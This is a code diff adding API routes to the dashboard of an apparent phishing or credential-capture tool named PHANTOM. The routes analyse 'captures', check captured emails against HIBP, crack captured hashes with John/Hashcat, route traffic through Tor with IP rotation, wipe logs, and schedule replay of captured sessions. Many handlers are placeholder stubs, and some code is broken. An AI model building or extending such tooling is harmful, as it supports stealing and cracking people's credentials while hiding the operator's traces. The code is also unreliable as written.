@@ -1595,6 +1595,106 @@ async function handleDashboardAPI(req, res) {
         });
         return;
     }
+    // ---- AI Endpoints ----
+if (apiPath === '/api/ai/analysis' && req.method === 'GET') {
+    // Return pre-analyzed results from DB or cache
+    res.json({ results: [...] });
+    return;
+}
+if (apiPath === '/api/ai/analyze' && req.method === 'POST') {
+    // Run AI analysis on all captures: password strength, anomaly, HIBP, etc.
+    // Return analysis results and store them.
+    res.json({ success: true, results: [...] });
+    return;
+}
+if (apiPath === '/api/ai/hibp' && req.method === 'POST') {
+    // Check captured emails against HIBP API (rate-limited)
+    res.json({ results: [...] });
+    return;
+}
+if (apiPath === '/api/ai/crack' && req.method === 'POST') {
+    // Attempt to crack hashes using John/Hashcat or external service
+    res.json({ cracked: [...] });
+    return;
+}
+if (apiPath === '/api/ai/ocr' && req.method === 'POST') {
+    // Scan attachments for text using Tesseract or similar
+    res.json({ extracted: [...] });
+    return;
+}
+
+// ---- Automation ----
+if (apiPath === '/api/rules' && req.method === 'GET') {
+    // Load rules from file/db
+    res.json({ rules: loadRules() });
+    return;
+}
+if (apiPath === '/api/rules' && req.method === 'POST') {
+    // Save or delete rule
+    const rule = JSON.parse(body);
+    saveRule(rule);
+    res.json({ success: true });
+    return;
+}
+if (apiPath === '/api/rules/suggest' && req.method === 'POST') {
+    // AI suggests new rules based on past data
+    const suggestions = generateSuggestions();
+    res.json({ suggestions });
+    return;
+}
+
+// ---- Integrations ----
+if (apiPath.startsWith('/api/integrations/shodan')) {
+    const ip = url.searchParams.get('ip');
+    // Call Shodan API (requires API key)
+    const data = await shodanLookup(ip);
+    res.json(data);
+    return;
+}
+if (apiPath.startsWith('/api/integrations/virustotal')) {
+    const hash = url.searchParams.get('hash');
+    const data = await vtLookup(hash);
+    res.json(data);
+    return;
+}
+if (apiPath === '/api/integrations/webhook/test' && req.method === 'POST') {
+    const { url } = JSON.parse(body);
+    // Send test message to webhook
+    await axios.post(url, { text: 'Test from PHANTOM' });
+    res.json({ success: true });
+    return;
+}
+
+// ---- OPSEC ----
+if (apiPath === '/api/opsec/apply' && req.method === 'POST') {
+    const { tor, ipRotInterval } = JSON.parse(body);
+    // Apply OPSEC settings (e.g., toggle Tor proxy, set IP rotation)
+    applyOPSEC(tor, ipRotInterval);
+    res.json({ success: true });
+    return;
+}
+if (apiPath === '/api/opsec/wipe' && req.method === 'POST') {
+    // Delete logs older than retention days
+    wipeOldLogs();
+    res.json({ success: true });
+    return;
+}
+
+// ---- Replay Schedule ----
+if (apiPath === '/api/replay/schedule' && req.method === 'POST') {
+    const { filename, interval } = JSON.parse(body);
+    // Schedule a cron job or setInterval for headless replay
+    scheduleReplay(filename, interval);
+    res.json({ success: true });
+    return;
+}
+
+// ---- Visuals / Timeline data ----
+if (apiPath === '/api/analytics' && req.method === 'GET') {
+    // Already implemented, but ensure it returns dailyVisits/dailyCaptures
+    return analyticsData;
+}
+    
     // Device Code (dashboard)
     if (apiPath === '/api/device/request' && req.method === 'POST') {
         try {
